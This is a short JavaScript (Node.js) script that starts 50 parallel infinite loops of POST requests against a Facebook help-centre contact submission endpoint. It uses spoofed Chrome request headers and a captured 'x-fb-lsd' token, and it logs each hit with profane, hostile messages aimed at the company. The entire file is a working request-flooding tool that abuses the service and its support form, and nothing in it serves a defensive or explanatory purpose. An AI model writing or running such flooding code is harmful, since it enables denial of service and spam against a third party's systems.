import fetch from 'node-fetch';

let i = 0
let ec = 0
const THREADS = 50
const REQ_BODY = ''

/*
The following two functions come from:
https://github.com/jkomyno/fetch-timeout
by Alberto Schiabel
 */

function timeoutPromise(promise, timeout, error) {
  return new Promise((resolve, reject) => {
    setTimeout(() => {
      reject(error);
    }, timeout);
    promise.then(resolve, reject);
  });
}``

function fetchTimeout(url, options, timeout, error) {
  error = error || 'Timeout error';
  options = options || {};
  timeout = timeout || 10000;
  return timeoutPromise(fetch(url, options), timeout, error);
};

async function init () {
  while (true) {
    try {
      const response = await fetchTimeout("https://www.facebook.com/ajax/help/contact/submit/page", {
        "headers": {
          "accept": "*/*",
          "accept-language": "pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7",
          "content-type": "application/x-www-form-urlencoded",
          "sec-ch-prefers-color-scheme": "dark",
          "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Google Chrome\";v=\"99\"",
          "sec-ch-ua-mobile": "?0",
          "sec-ch-ua-platform": "\"macOS\"",
          "sec-fetch-dest": "empty",
          "sec-fetch-mode": "cors",
          "sec-fetch-site": "same-origin",
          "viewport-width": "978",
          "x-fb-lsd": "kpHaqzdyUZbPIEz2osNhee"
        },
        "referrer": "https://www.facebook.com/help/contact/733689746780575",
        "referrerPolicy": "origin-when-cross-origin",
        "body": REQ_BODY,
        "method": "POST",
        "mode": "cors",
        "credentials": "include"
      }, 1000, 'timeout')
      i++
      console.log(`Fuck FB x${i} with ${response.status}`)
    } catch (e) {
      ec++
      console.log(`The bitch slipped away x${ec}, recently with ${e}`)
    }
  }
}

for(let t = 0; t < THREADS; t++) {
  init().then()
}
